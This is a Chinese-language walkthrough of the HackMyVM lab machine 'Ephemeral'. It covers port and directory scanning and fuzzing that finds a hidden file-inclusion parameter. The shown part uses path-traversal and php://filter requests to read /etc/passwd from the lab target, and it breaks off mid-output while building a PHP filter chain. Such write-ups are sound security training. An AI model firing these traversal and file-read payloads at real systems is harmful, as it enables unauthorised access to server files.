---
title: Ephemeral
author: hgbe02
date: 2024-04-30
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Ephemeral.html"
---

# Ephemeral

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740578.png" alt="image-20240430135221500" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740579.png" alt="image-20240430135528314" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ rustscan -a 192.168.0.148 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.148:21
Open 192.168.0.148:22
Open 192.168.0.148:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:0d:44:3c:38:8f:c0:6d:5d:72:18:e6:d9:12:3e:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCp0CHgyqyNh4SkWN3U/RBNxdPfxovfPkv76iLRZaLvvoYM2W1QUsOoH3YaXmKj9FpHpkrc4EGy2OlOCqVVCy4XxagSyLuM1d0r/lHExM130qQ3RGmw3UBIQ2QW3gkk9rVKAD0Rq6QIXA4WMC5fIqbCPtO8bVOUBOYQcMB9LqvZnq/U6YTWFswBwLUnz3hC9+swoJf1bPduvsnlsAh0fbq11hDwf07K8N909uq7deZFpW8tHc9CBbV36XNP9ZBTrzkAY34dd+HdYLfFwYTDwcNY/IeiA5Fda9rrJ3CrHJWhiSEZmRSiNHKbpIVhEItOCGL2CiV9xKQ8I9S49oHSxmnegfDn44kPC/Q7pSg1zi3uOynExvnvrFiRdmcHNUJan6J42eRXMKXhz2HF0w4MJMvSkfXCOqYI+AOT30DSri8cAbJ22wkBoMqdHqPxphRar3Vi7P/Dd0hphcEd6W8Cc4Q4qWgUu7ZLeWexLm1Q1y+34c/ZOh1FbeQdpKMlvyUyPCc=
|   256 4d:7d:ba:6f:a9:88:ea:a2:34:3a:6a:0c:3a:27:1c:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCqt1OTJw7IiSOOAgyywjGQ1SOmIaKCP8n20uHpYR9p05bmivNL3gZprRJHVT4zYbGNE6ww8Ijq7/XVXL5DK/kU=
|   256 74:36:bf:af:8a:53:0a:c1:7f:ca:2e:a1:5c:c5:25:ad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOlgxVeTDNdBhlFLjaLPbFFsOyH6868QxDj7wfXzjgaW
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: AutoWash - Car Wash Website Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录发现

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ gobuster dir -u http://192.168.0.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.148/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,zip,bak,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 39494]
/contact.html         (Status: 200) [Size: 15151]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.148/img/]
/about.html           (Status: 200) [Size: 18464]
/blog.html            (Status: 200) [Size: 20094]
/mail                 (Status: 301) [Size: 313] [--> http://192.168.0.148/mail/]
/service.html         (Status: 200) [Size: 16853]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.148/css/]
/team.html            (Status: 200) [Size: 18605]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.0.148/lib/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.148/js/]
/cd                   (Status: 301) [Size: 311] [--> http://192.168.0.148/cd/]
/location.html        (Status: 200) [Size: 14685]
/price                (Status: 301) [Size: 314] [--> http://192.168.0.148/price/]
/price.html           (Status: 200) [Size: 14635]
/prices               (Status: 301) [Size: 315] [--> http://192.168.0.148/prices/]
/LICENSE.txt          (Status: 200) [Size: 1309]
/single.html          (Status: 200) [Size: 48856]
/booking.html         (Status: 200) [Size: 14677]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/phpsysinfo.php       (Status: 200) [Size: 69419]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740580.png" alt="image-20240430135938274" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740581.png" alt="image-20240430140010829" style="zoom: 33%;" />



### 敏感目录

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ http get http://192.168.0.148/         
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 4290
Content-Type: text/html
Date: Tue, 30 Apr 2024 06:03:16 GMT
ETag: "9a46-5b171bffcf480-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 12 Oct 2020 04:29:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding

┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ curl -s -i http://192.168.0.148/ | grep "hmv"
        
```

一直加载不出来，先用别的试一下：

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ curl -s -i http://192.168.0.148/blog.html | html2text | uniq
HTTP/1.1 200 OK Date: Tue, 30 Apr 2024 06:05:04 GMT Server: Apache/2.4.41
(Ubuntu) Last-Modified: Mon, 12 Oct 2020 04:26:44 GMT ETag: "4e7e-
5b171b4a9c900" Accept-Ranges: bytes Content-Length: 20094 Vary: Accept-Encoding
Content-Type: text/html

******_AutoWash_******
**** Opening Hour ****
Mon - Fri, 8:00 - 9:00
**** Call Us ****
+012 345 6789
**** Email Us ****
info@example.com

 MENU
Home About Service Price Washing_Points
Pages
Blog_Grid Detail_Page Team_Member Schedule_Booking
Contact
Get_Appointment

***** Blog Grid *****
Home Blog

Our Blog
***** Latest news & articles *****
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
[Image]
01 Jan 2045
**** Lorem_ipsum_dolor_sit_amet ****
Lorem ipsum dolor sit amet elit. Pellent iaculis blandit lorem, quis convall
diam eleife. Nam in arcu sit amet massa ferment quis enim. Nunc augue velit
metus congue eget semper
Admin
Web Design
15 Comments
    * Previous
    * 1
    * 2
    * 3
    * Next

***** Get In Touch *****
123 Street, New York, USA
+012 345 67890
info@example.com

***** Popular Links *****
About Us Contact Us Our Service Service Points Pricing Plan
***** Useful Links *****
Terms of use Privacy policy Cookies Help FQAs
***** Newsletter *****
[                    ] [                    ] Submit
© Your_Site_Name, All Right Reserved. Designed By HTML_Codex
```

```apl
http://192.168.0.148/price.html
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740582.png" alt="image-20240430141137751" style="zoom:50%;" />

```apl
http://192.168.0.148/phpsysinfo.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740583.png" alt="image-20240430141245321" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740585.png" alt="image-20240430143043243" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740586.png" alt="image-20240430141608085" style="zoom: 67%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740587.png" alt="image-20240430141644554" style="zoom:50%;" />

尝试看一下相关漏洞，但是无果，尝试爆破一下子目录：

```bash
┌──(kali💀kali)-[~/temp/Ephemeral]
└─$ feroxbuster -u http://192.168.0.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 3 -s 200 301 302
                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.148/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      312c http://192.168.0.148/img => http://192.168.0.148/img/
200      GET      125l      806w    65020c http://192.168.0.148/img/blog-2.jpg
200      GET       65l      166w     2598c http://192.168.0.148/mail/contact.js
301      GET        9l       28w      313c http://192.168.0.148/mail => http://192.168.0.148/mail/
301      GET        9l       28w      312c http://192.168.0.148/css => http://192.168.0.148/css/
301      GET        9l       28w      312c http://192.168.0.148/lib => http://192.168.0.148/lib/
200      GET      168l      960w     4092c http://192.168.0.148/lib/easing/easing.js
200      GET        1l       38w     2303c http://192.168.0.148/lib/easing/easing.min.js
200      GET       11l      188w    16964c http://192.168.0.148/lib/animate/animate.min.css
200      GET        0l        0w        0c http://192.168.0.148/lib/waypoints/links.php
301      GET        9l       28w      311c http://192.168.0.148/js => http://192.168.0.148/js/
200      GET      130l      236w     3347c http://192.168.0.148/js/main.js
301      GET        9l       28w      311c http://192.168.0.148/cd => http://192.168.0.148/cd/
301      GET        9l       28w      314c http://192.168.0.148/price => http://192.168.0.148/price/
301      GET        9l       28w      315c http://192.168.0.148/prices => http://192.168.0.148/prices/
200      GET        0l        0w        0c http://192.168.0.148/prices/filedownload.php
200      GET       86l      492w    39976c http://192.168.0.148/img/blog-1.jpg
200      GET       16l       66w     5067c http://192.168.0.148/img/testimonial-1.jpg
200      GET       42l      112w     1327c http://192.168.0.148/lib/flaticon/font/flaticon.css
200      GET      293l      688w    14685c http://192.168.0.148/location.html
200      GET       20l      106w     7346c http://192.168.0.148/img/testimonial-3.jpg
200      GET      214l     1439w   143119c http://192.168.0.148/img/carousel-3.jpg
200      GET        7l      279w    42766c http://192.168.0.148/lib/owlcarousel/owl.carousel.min.js
200      GET     2056l     3970w    38262c http://192.168.0.148/css/style.css
200      GET       84l      436w    33981c http://192.168.0.148/img/team-4.jpg
200      GET        6l       47w     4281c http://192.168.0.148/img/testimonial-4.jpg
200      GET        6l       64w     2936c http://192.168.0.148/lib/owlcarousel/assets/owl.carousel.min.css
200      GET      767l     1986w    39494c http://192.168.0.148/index.html
200      GET       15l       85w     6525c http://192.168.0.148/img/testimonial-2.jpg
200      GET      379l     1032w    20094c http://192.168.0.148/blog.html
200      GET      758l     2363w    48856c http://192.168.0.148/single.html
200      GET      101l      553w    40061c http://192.168.0.148/img/team-2.jpg
200      GET      293l      687w    14677c http://192.168.0.148/booking.html
200      GET       52l      421w    31803c http://192.168.0.148/img/team-1.jpg
200      GET      290l      682w    14635c http://192.168.0.148/price.html
200      GET        1l        1w     1360c http://192.168.0.148/lib/flaticon/backup.txt
200      GET      291l      705w    15151c http://192.168.0.148/contact.html
200      GET        1l      245w    14877c http://192.168.0.148/mail/jqBootstrapValidation.min.js
200      GET      340l      910w    16853c http://192.168.0.148/service.html
200      GET       78l      460w    35288c http://192.168.0.148/img/blog-3.jpg
200      GET       11l       56w     2406c http://192.168.0.148/lib/counterup/counterup.min.js
200      GET      377l      893w    18464c http://192.168.0.148/about.html
200      GET      366l      857w    18605c http://192.168.0.148/team.html
200      GET      199l     1296w   122966c http://192.168.0.148/img/carousel-2.jpg
200      GET        7l      158w     9028c http://192.168.0.148/lib/waypoints/waypoints.min.js
200      GET      296l     1708w   148853c http://192.168.0.148/img/about.jpg
200      GET      241l     1306w   111758c http://192.168.0.148/img/carousel-1.jpg
200      GET       73l      388w    29305c http://192.168.0.148/img/team-3.jpg
200      GET       16l       84w     7150c http://192.168.0.148/img/post-3.jpg
200      GET       20l       98w     7813c http://192.168.0.148/img/post-5.jpg
200      GET       19l      116w     7958c http://192.168.0.148/img/post-4.jpg
200      GET      469l     2466w   189485c http://192.168.0.148/img/single.jpg
200      GET      319l     1812w   123171c http://192.168.0.148/img/page-header.jpg
200      GET       18l       76w     6428c http://192.168.0.148/img/user.jpg
200      GET       18l       83w     5996c http://192.168.0.148/img/post-1.jpg
200      GET       15l      116w     9206c http://192.168.0.148/img/post-2.jpg
200      GET      767l     1986w    39494c http://192.168.0.148/
200      GET     1579l     2856w    25427c http://192.168.0.148/lib/animate/animate.css
200      GET       23l      172w     1090c http://192.168.0.148/lib/owlcarousel/LICENSE
200      GET     3275l     9533w    85368c http://192.168.0.148/lib/owlcarousel/owl.carousel.js
[####################] - 82s   220661/220661  0s      found:60      errors:0      
[####################] - 81s   220546/220546  2716/s  http://192.168.0.148/ 
[####################] - 3s    220546/220546  78992/s http://192.168.0.148/img/ => Directory listing
[####################] - 3s    220546/220546  66052/s http://192.168.0.148/mail/ => Directory listing
[####################] - 3s    220546/220546  65405/s http://192.168.0.148/css/ => Directory listing
[####################] - 3s    220546/220546  70417/s http://192.168.0.148/lib/ => Directory listing
[####################] - 3s    220546/220546  70327/s http://192.168.0.148/lib/animate/ => Directory listing
[####################] - 3s    220546/220546  70620/s http://192.168.0.148/lib/easing/ => Directory listing
[####################] - 3s    220546/220546  63963/s http://192.168.0.148/lib/waypoints/ => Directory listing
[####################] - 4s    220546/220546  62620/s http://192.168.0.148/lib/counterup/ => Directory listing
[####################] - 3s    220546/220546  63121/s http://192.168.0.148/lib/owlcarousel/ => Directory listing
[####################] - 0s    220546/220546  27568250/s http://192.168.0.148/js/ => Directory listing
[####################] - 0s    220546/220546  18378833/s http://192.168.0.148/cd/ => Directory listing
[####################] - 0s    220546/220546  13784125/s http://192.168.0.148/price/ => Directory listing
[####################] - 0s    220546/220546  10024818/s http://192.168.0.148/prices/ => Directory listing
[####################] - 0s    220546/220546  2100438/s http://192.168.0.148/lib/flaticon/ => Directory listing
```

尝试多个目录没有发现，得尝试FUZZ一下：

敏感目录大致如下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740588.png" alt="image-20240430150538189" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740589.png" alt="image-20240430150639493" style="zoom:50%;" />

没有收获，还有敏感的php文件：

```bash
http://192.168.0.148/prices/filedownload.php
```

没有东西，但是阔以尝试fuzz。

### FUZZ

尝试添加dns解析进行fuzz：

```apl
192.168.0.148   ephemeral.hmv
```

尝试进行fuzz：

```bash
ffuf -u http://ephemeral.hmv -H "HOST: FUZZ.ephemeral.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
ffuf -u http://ephemeral.hmv -H "HOST: FUZZ.ephemeral.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 19456
ffuf -u http://ephemeral.hmv -H "HOST: FUZZ.ephemeral.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 19456
ffuf -u http://ephemeral.hmv -H "HOST: ephemeral.FUZZ.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 19456
ffuf -u http://ephemeral.hmv -H "HOST: ephemeral.hmv.FUZZ" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 19456
```

但是没结果，尝试fuzz一下LFI漏洞，这个靶场确实有点阴间，主要是字典上的，请见vcr。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740590.png" alt="image-20240430151115213" style="zoom:50%;" />

```bash
┌──(root㉿kali)-[/home/kali/temp/Ephemeral]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.148/prices/filedownload.php?FUZZ=../../../../../etc/passwd -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.148/prices/filedownload.php?FUZZ=../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

AssignmentForm          [Status: 200, Size: 3091, Words: 40, Lines: 54, Duration: 121ms]
:: Progress: [6453/6453] :: Job [1/1] :: 59 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

知道阴间在哪了吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404301740591.png" alt="image-20240430150909124" style="zoom:50%;" />

有且唯一，不知道其他师傅咋做的。。。。进行包含！

```bash
┌──(root㉿kali)-[/home/kali/temp/Ephemeral]
└─# curl -s -i http://192.168.0.148/prices/filedownload.php?AssignmentForm=../../../../../etc/passwdHTTP/1.1 200 OK
Date: Tue, 30 Apr 2024 07:12:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3091
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
kevin:x:1000:1000:kevin,,,:/home/kevin:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:127:134:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
mysql:x:129:135:MySQL Server,,,:/nonexistent:/bin/false
jane:x:1001:1001:,,,:/home/jane:/bin/bash
donald:x:1004:1004::/home/donald:/bin/rbash
randy:x:1002:1002:,,,:/home/randy:/bin/bash
```

### php filter 链构造

然后尝试伪协议进行包含：

```bash
┌──(root㉿kali)-[/home/kali/temp/Ephemeral]
└─# http get http://192.168.0.148/prices/filedownload.php?AssignmentForm=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 1699
Content-Type: text/html; charset=UTF-8
Date: Tue, 30 Apr 2024 07:13:55 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding

cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExNDo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExNTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmF2YWhpLWF1dG9pcGQ6eDoxMDk6MTE2OkF2YWhpIGF1dG9pcCBkYWVtb24sLCw6L3Zhci9saWIvYXZhaGktYXV0b2lwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMTA6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4KcnRraXQ6eDoxMTE6MTE3OlJlYWx0aW1lS2l0LCwsOi9wcm9jOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMTI6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmN1cHMtcGstaGVscGVyOng6MTEzOjEyMDp1c2VyIGZvciBjdXBzLXBrLWhlbHBlciBzZXJ2aWNlLCwsOi9ob21lL2N1cHMtcGstaGVscGVyOi91c3Ivc2Jpbi9ub2xvZ2luCnNwZWVjaC1kaXNwYXRjaGVyOng6MTE0OjI5OlNwZWVjaCBEaXNwYXRjaGVyLCwsOi9ydW4vc3BlZWNoLWRpc3BhdGNoZXI6L2Jpbi9mYWxzZQphdmFoaTp4OjExNToxMjE6QXZhaGkgbUROUyBkYWVtb24sLCw6L3Zhci9ydW4vYXZhaGktZGFlbW9uOi91c3Ivc2Jpbi9ub2xv